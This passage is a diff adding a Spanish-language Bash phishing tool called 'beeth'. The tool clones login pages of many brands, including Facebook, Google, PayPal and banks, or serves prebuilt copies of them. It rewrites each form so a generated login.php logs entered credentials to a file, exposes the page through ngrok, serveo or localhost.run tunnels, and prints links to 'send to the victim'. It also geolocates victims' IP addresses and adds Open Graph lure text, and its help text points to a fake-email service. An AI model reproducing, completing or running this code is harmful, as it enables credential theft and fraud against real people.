@@ -1,0 +1,1045 @@
+#Create by https://github.com/HiddenSt4r
+#Si copias deja creditos 😛
+
+trap 'printf "\n";stop;exit 1' 2
+r="\e[1;91m"
+v="\e[1;92m"
+a="\e[1;93m"
+b="\e[1;39m"
+m="\e[1;96m"
+z="\e[1;94m"
+n="\e[38;5;214m"
+rnd=`shuf -i 3000-10000 -n 1`
+crnd=`shuf -i 1-9 -n 1`
+DIA=`date +"%d/%m/%Y"`
+HORA=`date +"%H:%M"`
+link="localhost:$rnd"
+s="m"
+colors="\e[1;3$crnd$s"
+	
+finish() {
+eliminar
+dt
+echo -e "$v[$b*$v]$b beeth by HiddenStar😛\n$v[$b*$v]$b https://github.com/HiddenSt4r"
+
+if [[ -d $carpeta/images ]];then
+rm -rf images
+fi
+if [[ -e "$carpeta/alert.js" ]];then
+rm -rf alert.js
+fi
+if [[ $si_clone == "si" ]];then
+absolutamentenada="lol"
+else
+sed -i "/<meta property='og:.*' content='.*'/d" ./$carpeta/index.html
+sed -i "/<script src='alert.js'/d" ./$carpeta/index.html
+fi
+}
+	
+archivos(){
+if [[ -d websites ]];then
+holaque="hace"
+else
+echo -e "$r[!]$b Ooops Eliminaste una carpeta:( > websites"
+exit 1
+fi
+
+if [[ -d clone ]];then
+if [[ -e "clone/index.php" ]];then
+skskskdk="ksksksk"
+else
+cp websites/amazon_es/index.php clone
+fi
+
+if [[ -e "clone/ip.php" ]];then
+skskskdk="ksksksk"
+else
+cp websites/amazon_es/ip.php clone
+fi
+
+if [[ -e "clone/.bs4" ]];then
+skskskdk="ksksksk"
+else
+cp websites/facebook_us/.bs4 clone
+fi
+
+if [[ -e "clone/.get" ]];then
+skskskdk="ksksksk"
+else
+cp websites/facebook_us/.get clone
+fi
+
+else
+mkdir clone
+cp websites/amazon_es/index.php clone
+cp websites/amazon_es/ip.php clone
+cp websites/facebook_us/.bs4 clone
+cp websites/facebook_us/.get clone
+fi
+}
+
+stop(){
+checkng=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkng == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+if [[ $checkphp == *'php'* ]]; then
+pkill -f -2 php > /dev/null 2>&1
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+pkill -f -2 ssh > /dev/null 2>&1
+killall ssh > /dev/null 2>&1
+fi
+}
+
+banner(){
+command -v python > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando python..."; pkg install python -y;}
+command -v wget > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando wget..."; pkg install wget -y;}
+eliminar
+dt
+clear
+echo -e "$colors
+	 _______  _______  _______  _______  __   __
+        |  _    ||       ||       ||       ||  | |  |
+        | |_|   ||    ___||    ___||_     _||  |_|  |
+        |       ||   |___ |   |___   |   |  |       |
+        |  _   | |    ___||    ___|  |   |  |       |
+        | |_|   ||   |___ |   |___   |   |  |   _   |
+        |       ||       ||       |  |   |  |       |
+        |_______||_______||_______|  |___|  |__| |__|
+
+
+       $a[!]$b         Phishing Tool v2.5            $a[!]
+       $a[!]$b    https://github.com/HiddenSt4r      $a[!]
+       $a[!]$b help            < Ayuda               $a[!]
+       $a[!]$b show options    < Opciones            $a[!]
+       $a[!]$b show pages      < Paginas disponibles $a[!]
+       $a[!]$b clone web <url> < Clona una pagina    $a[!]
+
+"
+}
+
+delete_clone(){
+if [[ -f clone/foundip.txt ]];then
+rm clone/foundip.txt
+fi
+if [[ -f clone/founduser.txt ]];then
+rm clone/founduser.txt
+fi
+if [[ -f clone/index.htmll ]];then
+rm clone/index.htmll
+fi
+if [[ -f clone/index.html ]];then
+rm clone/index.html
+fi
+if [[ -d clone/images ]];then
+rm -rf clone/images
+fi
+if [[ -f clone/login.php ]];then
+rm clone/login.php
+fi
+if [[ -f clone/name ]];then
+rm clone/name
+fi
+if [[ -f clone/name.txt ]];then
+rm clone/name.txt
+fi
+}
+
+eliminar(){
+if [[ $si_clone == "si" ]];then
+if [[ -f clone/foundip.txt ]];then
+rm clone/foundip.txt
+fi
+if [[ -f clone/founduser.txt ]];then
+rm clone/founduser.txt
+fi
+if [[ -f clone/index.htmll ]];then
+rm clone/index.htmll
+fi
+if [[ -f clone/index.html ]];then
+rm clone/index.html
+fi
+if [[ -d clone/images ]];then
+rm -rf clone/images
+fi
+if [[ -f clone/login.php ]];then
+rm clone/login.php
+fi
+if [[ -f clone/name ]];then
+rm clone/name
+fi
+if [[ -f clone/name.txt ]];then
+rm clone/name.txt
+fi
+fi
+}
+
+dt(){
+if [[ -f infoip ]];then
+rm infoip
+fi
+if [[ -f link ]];then
+rm link
+fi
+if [[ -f run ]];then
+rm run
+fi
+if [[ -f show ]];then
+rm show
+fi
+if [[ -f 'set' ]];then
+rm "set"
+fi
+
+}
+
+change(){
+ grep -o 'action=".*\"' index.html | cut -d '"' -f2 > name
+ while  read -r line
+ do
+   IFS=$'\n'
+   sed 's+'$line'+'login.php'+g' index.html > index.htmll
+ done < name
+}
+
+
+mod_php(){
+while  read -r line
+ do
+   IFS=$'\n'
+printf "\nif (!empty(\$_POST['%s'])) {" $line >> login.php
+printf "file_put_contents(\"founduser.txt\", \"%s: \"  . \$_POST['%s'] . \"\\n\", FILE_APPEND);" $line $line >> login.php
+printf "\n}" >>  login.php
+
+printf "\nif (!empty(\$_GET['%s'])) {" $line >> login.php
+printf "file_put_contents(\"founduser.txt\", \"%s: \"  . \$_GET['%s'] . \"\\n\", FILE_APPEND);" $line $line >> login.php
+printf "\n}" >>  login.php
+ done < name.txt
+
+printf "\nexit();" >> clone/login.php
+}
+
+confirmar(){
+read -p $'\e[0mbeeth > ' var opc web
+if [[ $var == "clone" && $opc == "web" && $web != "" ]];then
+clonada=$web
+si_clone="si"
+nose=$web
+clone="clone"
+rede=$web
+pop="$nose"
+carpeta="clone"
+pagina="pagina"
+delete_clone
+trap finish EXIT
+existe="si"
+confirmar
+
+elif [[ $var == "set" && $opc == "tunnel" && $web != "" ]];then
+if [[ $web == "ngrok" ]];then
+tunnel_elegido="ngrok"
+firma="tunnel"
+confirmar
+elif [[ $web == "serveo" ]];then
+tunnel_elegido="serveo"
+firma="tunnel"
+confirmar
+elif [[ $web == "local.run" ]];then
+tunnel_elegido="local.run"
+firma="tunnel"
+confirmar
+else
+echo -e "$r[*]$b Tunnel no encontrado > $web"
+confirmar
+fi
+
+elif [[ $var == "set" && $opc == "port" && $web != "" ]];then
+checkp=$web
+if [[ $checkp -ge "3000" ]];then
+prnd=$web
+tunnel_elegido="puerto"
+firma="tunnel"
+confirmar
+else
+echo -e "$r[!]$b Selecciona un puerto mayor a 3000"
+confirmar
+fi
+
+elif [[ $var == "set" && $opc == "page" && $web != "" ]];then
+if [[ -d websites/$web ]];then
+si_clone="no"
+pagina="pagina"
+existe="si"
+nose=$web
+rede=$web
+carpeta="websites/$nose"
+pop3=$(echo "$nose" | cut -d "_" -f1)
+pop="https://www.$pop3.com"
+if [[ -f $carpeta/foundip.txt ]];then
+rm $carpeta/foundip.txt
+fi
+if [[ -f $carpeta/founduser.txt ]];then
+rm $carpeta/founduser.txt
+fi
+trap finish EXIT
+confirmar
+else
+echo -e "$r[!]$b La pagina no existe."
+confirmar
+fi
+
+elif [[ $var == "set" && $opc == "action_url" && $web != "" ]];then
+rede=$web
+action="action"
+confirmar
+
+elif [[ $var == "show" && $opc == "title" && $web != "" ]];then
+if [[ $existe == "si" ]];then
+titulo=$web
+show="t"
+confirmar
+else
+echo -e "$r[*]$b Primero debes agregar una pagina"
+confirmar
+fi
+
+elif [[ $var == "show" && $opc == "image" && $web != "" ]];then
+if [[ $existe == "si" ]];then
+ruta=$web
+if [[ -f $ruta ]];then
+show0="i"
+confirmar
+else
+echo -e "$r[!]$b Imagen no encontrada"
+confirmar
+fi
+else
+echo -e "$r[*]$b Primero debes agregar una pagina"
+confirmar
+fi
+
+elif [[ $var == "show" && $opc == "description" && $web != "" ]];then
+if [[ $existe == "si" ]];then
+desc=$web
+show1="d"
+confirmar
+else
+echo -e "$r[*]$b Primero debes agregar una pagina"
+confirmar
+fi
+
+elif [[ $var == "show" && $opc == "url" && $web != "" ]];then
+if [[ $existe == "si" ]];then
+url=$web
+show2="u"
+confirmar
+else
+echo -e "$r[*]$b Primero debes agregar una pagina"
+confirmar
+fi
+
+elif [[ $var == "show" && $opc == "alert" && $web != "" ]];then
+if [[ $existe == "si" ]];then
+alert=$web
+show3="a"
+confirmar
+else
+echo -e "$r[*]$b Primero debes agregar una pagina"
+confirmar
+fi
+
+elif [[ $var == "show" && $opc == "pages" && $web == "" ]];then
+pages
+
+elif [[ $var == "show" && $opc == "options" && $web == "" ]];then
+echo -e "\n$r[*]$b Obligatorio de completar (set page o clone web, set tunnel)"
+echo -e "$n[*]$b Opcional\n"
+if [[ $existe == "si" ]];then
+echo -e "$v[*]$b Pagina > $nose"
+fi
+
+if [[ $existe != "si" ]];then
+echo -e "$r[!]$b Pagina > No agregada"
+fi
+
+if [[ $firma == "tunnel" ]];then
+echo -e "$v[*]$b Tunnel > $tunnel_elegido"
+fi
+
+if [[ $firma != "tunnel" ]];then
+echo -e "$r[!]$b Tunnel > No agregado"
+fi
+
+if [[ $action == "action" ]];then
+echo -e "$v[*]$b Acción > $rede"
+fi
+
+if [[ $action != "action" ]];then
+echo -e "$n[!]$b Acción > No agregada"
+fi
+
+if [[ $show == "t" ]];then
+echo -e "$v[*]$b Titulo > $titulo"
+fi
+
+if [[ $show != "t" ]];then
+echo -e "$n[!]$b Titulo > No agregado"
+fi
+
+if [[ $show0 == "i" ]];then
+echo -e "$v[*]$b Imagen > $ruta"
+fi
+
+if [[ $show0 != "i" ]];then
+echo -e "$n[!]$b Imagen > No agregada"
+fi
+
+if [[ $show1 == "d" ]];then
+echo -e "$v[*]$b Descripción > Agregada"
+fi
+
+if [[ $show1 != "d" ]];then
+echo -e "$n[!]$b Descripción > No agregada"
+fi
+
+if [[ $show2 == "u" ]];then
+echo -e "$v[*]$b Url > $url"
+fi
+
+if [[ $show2 != "u" ]];then
+echo -e "$n[!]$b Url > No agregada"
+fi
+
+if [[ $show3 == "a" ]];then
+echo -e "$v[*]$b Alert Box > $alert"
+fi
+
+if [[ $show3 != "a" ]];then
+echo -e "$n[!]$b Alert Box > No agregado"
+fi
+
+if [[ $existe == "si" && $firma == "tunnel" ]];then
+echo -e "$a[*]$ba Perfecto puedes enpezar!! (run) $a[*]"
+else
+echo -e "$r[*]$b Aun falta completar algunos campos $r[*]"
+fi
+echo
+confirmar
+
+elif [[ $var == "help" ]];then
+echo -e "\n$a[*]$b Puedes elegir cualquiera de las opciones(obligatorio)."
+echo -e "$z[*]$b Puedes dejarlo vacio, tomara los datos de la pagina ingresada."
+echo -e "$n[*]$b Opcional (puede no funcionar en paginas clonadas)\n"
+echo -e "$a[>]$b set page <pagina>  Puedes ver la lista de paginas escribiendo show pages."
+echo -e "$a[>]$b clone web <link> Clona la pagina elegida.\n"
+echo -e "$a[>]$b set tunnel <tunnel> ngrok/serveo/local.run"
+echo -e "$a[>]$b set port <puerto>   Esto es por si el proceso lo quieres hacer manualmente.\n"
+echo -e "$z[>]$b set action_url <url> Redirige a la victima.\n"
+echo -e "$n[>]$b show title <titulo>      Muestra un titulo al enviar el link."
+echo -e "$n[>]$b show image <imagen>      Muestra una imagen al enviar el link."
+echo -e "$n[>]$b show description <texto> Muestra una descripción al enviar el link."
+echo -e "$n[>]$b show url   <url>         Muestra una una url al enviar el link."
+echo -e "$n[>]$b show alert <texto>       Muestra un mensaje de alerta al entrar al link $r($b Podria causar errores$r )"
+echo -e "\n$v[*]$b Ejemplo: .:Forma completa:.\e[0m"
+echo "beeth > clone web https://m.facebook.com"
+echo "beeth > set tunnel ngrok"
+echo "beeth > set action_url https://m.facebook.com/videos"
+echo "beeth > show title Facebook Log In"
+echo "beeth > show image /sdcard/miimagen.png"
+echo "beeth > show description Mira este video!!"
+echo "beeth > show url facebook.com"
+echo "beeth > run"
+echo -e "\n$v[*]$b Ejemplo: .:Seleccionar pagina:.\e[0m"
+echo -e "beeth > set page facebook_es $b #Usa show pages para mostrar todas las paginas."
+echo -e "\e[0mbeeth > set tunnel ngrok"
+echo "beeth > set action_url https://m.facebook.com/videos"
+echo "beeth > show title Facebook Log In"
+echo "beeth > show image /sdcard/miimagen.png"
+echo "beeth > show description Mira este video!!"
+echo "beeth > show url facebook.com"
+echo "beeth > run"
+
+echo -e "\n$v[*]$b Ejemplo:\e[0m .:Forma rapida:."
+echo "beeth > clone web https://m.facebook.com"
+echo "beeth > set tunnel ngrok"
+echo "beeth > run"
+
+echo -e "\n$v[*]$b Ejemplo: .:Hacerlo manualmente:.\e[0m"
+echo "beeth > clone web https://m.facebook.com"
+echo "beeth > set port 3333"
+echo "beeth > run"
+
+echo -e "\n$v[*]$b Ejemplo: .:Redireccionar:.\e[0m"
+echo "beeth > clone web https://m.facebook.com"
+echo "beeth > set tunnel serveo"
+echo "beeth > set action_url https://m.facebook.com/videos"
+echo -e "beeth > run\n"
+echo -e "$v[*]$b Pagina para enviar correo falso:"
+echo -e "$v[*]$b https://emailspoofbyharris.000webhostapp.com\n"
+echo -e "$r[!]$b Los campos necesarios de completar son la web y el tunnel o puerto $r[!]\n"
+confirmar
+
+elif [[ $var == "run" || $var == "start" ]];then
+if [[ $firma == "tunnel" && $pagina == "pagina" ]];then
+if [[ $tunnel_elegido == "ngrok" ]];then
+if [[ -f ngrok ]];then
+SITIENEELNEGROK="XD"
+else
+command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando git..."; pkg install git -y;}
+ar=$(uname -a | grep -o 'arm' | head -n1)
+ar2=$(uname -a | grep -o 'Android' | head -n1)
+if [[ $ar == *'arm'* ]] || [[ $ar2 == *'Android'* ]] ; then
+echo -e "$v[*]$b Instalando ngrok..."
+git clone https://github.com/HarrisSec/best-ngrok
+cd best-ngrok
+mv ngrok $OLDPWD
+cd $OLDPWD
+if [[ -d best-ngrok ]];then
+rm -rf best-ngrok
+else
+echo -e "$r[!]$b Comprueba tu conexión."
+exit 1
+fi
+
+else
+echo -e "$v[*]$b Instalando ngrok..."
+wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+if [[ -e ngrok-stable-linux-386.zip ]]; then
+unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+chmod +x ngrok
+rm -rf ngrok-stable-linux-386.zip
+else
+echo -e "$r[!]$b Comprueba tu conexión."
+exit 1
+fi
+
+fi
+
+fi
+enpezar
+
+elif [[ $tunnel_elegido == "serveo" ]];then
+enpezar
+
+elif [[ $tunel_elegido == "localhost.run" ]];then
+enpezar
+
+elif [[ $tunnel_elegido != "ngrok" || $tunnel_elegido != "serveo" ]];then
+enpezar
+fi
+
+elif [[ $pagina != "pagina" ]];then
+echo -e "$r[*]$b Selecciona una pagina o clona una"
+confirmar
+elif [[ $firma != "tunnel" ]];then
+echo -e "$r[*]$b Selecciona un tunnel o puerto"
+confirmar
+fi
+else
+echo -e "$r[*]$b Comando no encontrado > $var $opc $web"
+confirmar
+fi
+}
+
+ngrok(){
+cd $carpeta && php -S localhost:3333 > /dev/null 2>&1 &
+echo -e "$v[*]$b Enpezando..."
+sleep 2
+./ngrok http 3333 > /dev/null 2>&1 &
+echo -e "$v[*]$b Verifica una buena conexión a internet..."
+sleep 5
+echo -e "$v[*]$b Abriendo servidor PHP..."
+sleep 7
+echo -e "$v[*]$b Abriendo servidor ngrok..."
+sleep 7
+echo -e "$v[*]$b Obteniendo links..."
+sleep 5
+envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+echo -e "$v[*]$b localhost:3333"
+if [[ $envialink == "" ]];then
+echo -e "$r[!]$b No se puedo conectar prueba otro servidor"
+exit 1
+else
+echo -e "$v[*]$b Envia a la victima > " $envialink
+cutt
+mas_opciones
+check_found
+fi
+}
+
+serveo(){
+command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando openssh..."; pkg install openssh -y;}
+cd $carpeta && php -S localhost:3333 > /dev/null 2>&1 &
+echo -e "$v[*]$b Enpezando..."
+sleep 2
+if [[ -f link ]]; then
+rm -rf link
+fi
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > link ' &
+echo -e "$v[*]$b Abriendo servidor PHP..."
+sleep 5
+echo -e "$v[*]$b Abriendo servidor...."
+sleep 5
+echo -e "$v[*]$b Obteniendo links..."
+sleep 5
+envialink=$(grep -o "https://[0-9a-z]*\.serveo.net" link)
+echo -e "$v[*]$b localhost:3333"
+if [[ $(cat link) == "" ]];then
+echo -e "$r[!]$b No se puedo conectar prueba otro servidor"
+exit 1
+else
+echo -e "$v[*]$b Envia a la victima > $envialink"
+echo -e "$v[*]$b Envia a la victima > " $pop2
+if [[ -f link ]];then
+rm link
+fi
+cutt
+mas_opciones
+check_found
+fi
+}
+
+local.run(){
+command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando openssh..."; pkg install openssh -y;}
+cd $carpeta && php -S localhost:3333 > /dev/null 2>&1 &
+echo -e "$v[*]$b Enpezando..."
+sleep 2
+if [[ -f run ]];then
+rm run
+fi
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 ssh.localhost.run 2> /dev/null > run ' &
+
+echo -e "$v[*]$b Abriendo servidor PHP..."
+sleep 5
+echo -e "$v[*]$b Abriendo servidor...."
+sleep 5
+echo -e "$v[*]$b Obteniendo links..."
+sleep 5
+envialink=$(grep -o "https://u0_[0-9a-z]*\.localhost.run" run)
+echo -e "$v[*]$b localhost:$port"
+if [[ $(cat run) == "" ]];then
+echo -e "$r[!]$b No se puedo conectar prueba otro servidor"
+exit 1
+else
+echo -e "$v[*]$b Envia a la victima > $envialink"
+echo -e "$v[*]$b Envia a la victima > " $pop2
+if [[ -f run ]];then
+rm run
+fi
+cutt
+mas_opciones
+check_found
+fi
+}
+
+cutt(){
+namee=$(echo "$envialink" | cut -d "/" -f3)
+pop9="$pop@$namee"
+echo -e "$v[*]$b Envia a la victima > " $pop9
+}
+
+puerto(){
+php -S localhost:$prnd > /dev/null 2>&1 &
+echo -e "$v[*]$b Abriendo servidor PHP..."
+sleep 2
+echo -e "$v[*]$b localhost:$prnd\n"
+check_found
+}
+
+check_found(){
+echo -e "$v[*]$b Esperando Datos$v [*]"
+while true;do
+if [[ -e "$carpeta/foundip.txt" ]];then
+sed -i '3iIP Encontrada: '"$HORA"' '"$DIA"' - de - '"$nose"'' $carpeta/foundip.txt
+echo
+echo -e "$v[*]$a IP Encontrada!!"
+found_ip
+rm $carpeta/foundip.txt
+sleep 0.5
+fi
+
+if [[ -e "$carpeta/founduser.txt" ]];then
+echo -e "$v[*]$a Datos Encontrados!!"
+sed -i '1iDatos Encontrados: '"$HORA"' '"$DIA"' - de - '"$nose"'' $carpeta/founduser.txt
+found_user
+if [[ $si_clone == "si" ]];then
+sed -i '1i ============================================' $carpeta/founduser.txt
+sed -i '$a ============================================' $carpeta/founduser.txt
+else
+nadaaaa="nadaaa"
+fi
+cat $carpeta/founduser.txt >> $carpeta/account.txt
+rm $carpeta/founduser.txt
+fi
+sleep 0.5
+done
+
+}
+
+found_ip(){
+ip=$(grep -a 'IP:' $carpeta/foundip.txt | cut -d " " -f2 | tr -d '\r')
+agent=$(grep 'User-Agent:.*' $carpeta/foundip.txt | cut -d ':' -f2)
+saved_to="\e[1;33mIP guardada:$b $carpeta/ip.txt"
+echo -e "$a[*]$v IP:$b " $ip
+echo
+echo -e  "$a[*]$v User-Agent:$b"$agent
+echo
+echo -e $saved_to
+cat $carpeta/foundip.txt >> $carpeta/ip.txt
+echo
+dates_ip
+echo
+echo -e "$v[$b*$v]$b Esperando proximos datos$v [$b*$v]"
+echo
+}
+
+found_user(){
+saved_to="\e[1;33mDatos guardados:$b $carpeta/account.txt"
+echo -e "\e[0m"
+cat $carpeta/founduser.txt
+echo -e "\n$saved_to"
+echo
+echo -e "$v[$b*$v]$b Esperando proximos datos$v [$b*$v]"
+echo
+}
+
+dates_ip(){
+ipfind=$(curl -s -L "http://ip-api.com/json/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > infoip)
+
+query=$(grep -o '"query":.*' infoip | cut -d '"' -f4)
+
+if [[ $query == "" ]]; then
+echo -e "$v[*] Hostname:$b Unknown"
+else
+echo -e "$v[*] Hostname:$b" $query
+fi
+
+country=$(grep -o '"country":.*' infoip | cut -d '"' -f4)
+
+if [[ $country == "" ]]; then
+
+echo -e "$v[*] Country:$b Unknown"
+else
+echo -e "$v[*] Country:$b" $country
+fi
+
+cc=$(grep -o '"countryCode":.*' infoip | cut -d '"' -f4)
+
+if [[ $cc == "" ]];then
+echo -e "$v[*] Country Code:$b Unknown"
+else
+echo -e "$v[*] Country Code:$b" $cc
+fi
+
+
+rn=$(grep -o '"regionName":.*' infoip | cut -d '"' -f4)
+if [[ $rn == "" ]];then
+echo -e "$v[*] Region:$b Unknown"
+
+else
+echo -e "$v[*] Region:$b" $rn
+fi
+
+city=$(grep -o '"city":.*' infoip | cut -d '"' -f4)
+if [[ $city == "" ]];then
+echo -e "$v[*] City:b Unknown"
+else
+echo -e "$v[*] City:$b" $city
+fi
+
+zip=$(grep -o '"zip":.*' infoip | cut -d '"' -f4)
+if [[ $zip == "" ]];then
+echo -e "$v[*] zip:$b Unknown"
+else
+echo -e "$v[*] zip:$b" $zip
+fi
+
+tz=$(grep -o '"timezone":.*' infoip | cut -d '"' -f4)
+if [[ $tz == "" ]];then
+echo -e "$v[*] Time Zone:$b Unknown"
+else
+echo -e "$v[*] Time Zone:$b" $tz
+fi
+
+isp=$(grep -o '"isp".*' infoip | cut -d '"' -f4)
+if [[ $isp == "" ]];then
+
+echo -e "$v[*] ISP:$b Unknown"
+else
+echo -e "$v[*] ISP:$b" $isp
+fi
+
+org=$(grep -o '"org":.*' infoip | cut -d '"' -f4)
+if [[ $org == "" ]];then
+echo -e "$v[*] org:$b Unknown"
+else
+echo -e "$v[*] org:$b" $org
+fi
+
+as=$(grep -o '"as":.*' infoip | cut -d '"' -f4)
+if [[ $as == "" ]];then
+echo -e "$v[*] AS:$b Unknown"
+else
+echo -e "$v[*] AS:$b" $as
+fi
+
+lan=$(grep -o '"lat":.*' infoip | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)
+lon=$(grep -o '"lon":.*' infoip | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)
+
+if [[ $lan == "" || $lon == "" ]];then
+echo -e "$v[*] Google Maps:$b Unknown"
+else
+link_maps="https://www.google.com/maps/place/$lan,$lon"
+echo -e "$v[*] Google Maps:$b" $link_maps
+
+rm infoip
+fi
+}
+
+clear_meta(){
+if [[ -f link ]];then
+rm link
+fi
+
+if [[ -d $carpeta/images ]];then
+rm -rf $carpeta/images
+fi
+
+if [[ -e "$carpeta/alert.js" ]];then
+rm $carpeta/alert.js
+fi
+
+if [[ -f infoip ]];then
+rm infoip
+fi
+
+if [[ -e "$carpeta/index.html" ]];then
+sed -i "/<meta property='og:.*' content='.*'/d" ./$carpeta/index.html
+sed -i "/<script src='alert.js'/d" ./$carpeta/index.html
+fi
+}
+
+show_title(){
+if [[ $si_clone == "si" ]];then
+ogtitle="<meta property='og:title' content='$titulo'/>"
+sed -i "/<meta property='og:title' content='.*'/d" ./$carpeta/index.html
+sed -i '2i '"$ogtitle"'' $carpeta/index.html
+else
+ogtitle="<meta property='og:title' content='$titulo'/>"
+sed -i "/<meta property='og:title' content='.*'/d" ./$carpeta/index.html
+sed -i '4i '"$ogtitle"'' $carpeta/index.html
+fi
+}
+
+show_photo(){
+if [[ $si_clone == "si" ]];then
+
+if [[ -d $carpeta/images ]];then
+rm -rf $carpeta/images
+fi
+mkdir $carpeta/images
+cp "$ruta" $carpeta/images
+obtener_name=$(basename "$ruta")
+total="$envialink/images/$obtener_name"
+ogimg="<meta property='og:image' content='$total'/>"
+sed -i "/<meta property='og:image' content='.*'/d" ./$carpeta/index.html
+sed -i '2i '"$ogimg"'' $carpeta/index.html
+
+else
+if [[ -d $carpeta/images ]];then
+rm -rf $carpeta/images
+fi
+mkdir $carpeta/images
+cp "$ruta" $carpeta/images
+obtener_name=$(basename "$ruta")
+total="$envialink/images/$obtener_name"
+ogimg="<meta property='og:image' content='$total'/>"
+sed -i "/<meta property='og:image' content='.*'/d" ./$carpeta/index.html
+sed -i '4i '"$ogimg"'' $carpeta/index.html
+fi
+}
+
+show_text(){
+if [[ $si_clone == "si" ]];then
+ogtext="<meta property='og:description' content='$desc' />"
+sed -i "/<meta property='og:description' content='.*'/d" ./$carpeta/index.html
+sed -i '2i '"$ogtext"'' $carpeta/index.html
+else
+ogtext="<meta property='og:description' content='$desc' />"
+sed -i "/<meta property='og:description' content='.*'/d" ./$carpeta/index.html
+sed -i '4i '"$ogtext"'' $carpeta/index.html
+fi
+}
+
+show_url(){
+if [[ $si_clone == "si" ]];then
+ogurl="<meta property='og:url' content='http://$url' />"
+sed -i "/<meta property='og:url' content='.*'/d" ./$carpeta/index.html
+sed -i '2i '"$ogurl"'' $carpeta/index.html
+
+else
+ogurl="<meta property='og:url' content='http://$url' />"
+sed -i "/<meta property='og:url' content='.*'/d" ./$carpeta/index.html
+sed -i '4i '"$ogurl"'' $carpeta/index.html
+fi
+}
+
+add_alert_box(){
+if [[ $si_clone == "si" ]];then
+ogalert="<script src='alert.js'/>"
+sed -i "/<script src='alert.js'/d" ./$carpeta/index.html
+if [[ -e "$carpeta/alert.js" ]];then
+rm $carpeta/alert.js
+fi
+echo "alert('$alert');" >> $carpeta/alert.js
+sed -i '2i '"$ogalert"'' $carpeta/index.html
+else
+ogalert="<script src='alert.js'/>"
+sed -i "/<script src='alert.js'/d" ./$carpeta/index.html
+if [[ -e "$carpeta/alert.js" ]];then
+rm $carpeta/alert.js
+fi
+echo "alert('$alert');" >> $carpeta/alert.js
+sed -i '4i '"$ogalert"'' $carpeta/index.html
+fi
+}
+
+fake(){
+sed -i "/<?php/d" ./$carpeta/login.php
+sed -i '1i <?php' $carpeta/login.php
+ogrede=" header('Location: $rede');"
+sed -i "/header('Location:.*)/d" ./$carpeta/login.php
+sed -i '2i '"$ogrede"'' $carpeta/login.php
+}
+
+enpezar(){
+if [[ $si_clone == "si" ]];then
+echo -e "$v[*]$b Descargando sitio..."
+python clone/.get $clonada
+
+if [[ -f index.html ]];then
+ksoaolzodo="ksosod"
+else
+echo -e "$r[!]$b No se pudo descargar la pagina revisa tu conexión."
+exit 1
+fi
+echo -e "$v[*]$b Modificando archivos..."
+python clone/.bs4 $clonada > name.txt
+if [[ $(cat name.txt) == "" ]] || [[ $(cat name.txt) == "Error" ]]; then
+echo -e "$r[!]$b Cuidado, inputs no encontrados"
+fi
+mod_php
+change
+
+if [[ -f index.htmll ]];then
+rm index.html
+mv index.htmll index.html
+mv index.html clone
+mv login.php clone
+rm name
+rm name.txt
+else
+echo -e "$r[!]$b Cuidado, Formulario no encontrado"
+fi
+
+fake
+$tunnel_elegido
+else
+if [[ $action == "action" ]];then
+fake
+$tunnel_elegido
+else
+$tunnel_elegido
+fi
+fi
+}
+
+pages(){
+echo -e "\e[1;39madobe		playstation"
+echo -e "amazon_es	pornhub"
+echo -e "amazon_us	primevideo_es"
+echo -e "apple	  	primevideos_us"
+echo -e "badoo_es	protonmail"
+echo -e "badoo_us	reddit"
+echo -e "devianart	shopify_es"
+echo -e "ebay_es		shopify_us"
+echo -e "ebay_us		snapchat_es"
+echo -e "facebook_es	snapchat_us"
+echo -e "facebook_us	spotify_es"
+echo -e "foursquare	spotify_us"
+echo -e "github	  	steam_es"
+echo -e "google_es	steam_us"
+echo -e "google_us	twitch_es"
+echo -e "icloud	  	twitch_us"
+echo -e "imgur	  	twitter_es"
+echo -e "instafollowers	twitter_us"
+echo -e "instagram_es	verizon"
+echo -e "instagram_us	vimeo"
+echo -e "linkedin_es	vk"
+echo -e "linkedin_us	wifi"
+echo -e "microsoft_es	wordpress"
+echo -e "microsoft_us	yahoo_es"
+echo -e "myspace		yahoo_us"
+echo -e "netflix_es	yandex"
+echo -e "netflix_us	yelp_es"
+echo -e "origin	 	yelp_us"
+echo -e "paypal_es	messenger"
+echo -e "paypal_us	mobile.facebook_es"
+echo -e "mobile.facebook_us     mobile.google_es"
+echo -e "pinterest_es	       mobile.google_us"
+echo -e "pinterest_us           mobile.instagram_es"
+echo -e "mobile.instagram_us    sign.google_es"
+echo -e "(fb)alertadeseguridad_es"
+echo -e "(fb)alertadeseguridad_us"
+echo -e "movistar"
+echo -e "pavosgratis"
+echo -e "claro			   sign.google_us"
+echo -e "diamantesgratis	   	   telekom"
+echo -e "directv		   	   telmex"
+echo -e "generadorderecursos	   tigo"
+echo -e "googlewlan		   tplink"
+echo -e "huawei"
+echo -e "\n$v[*]$b Ejemplo:"
+echo -e "$n[*]$b set page facebook_es   //Pagina en español"
+echo -e "$n[*]$b set page facebook_us   //Pagina en ingles"
+confirmar
+}
+
+mas_opciones(){
+if [[ $show == "t" || $show == "i" || $show == "d" || $show == "u" || $show == "a" ]];then
+if [[ $si_clone == "si" ]];then
+sed -i '1i <head>' $carpeta/index.html
+sed -i '2i </head>' $carpeta/index.html
+else
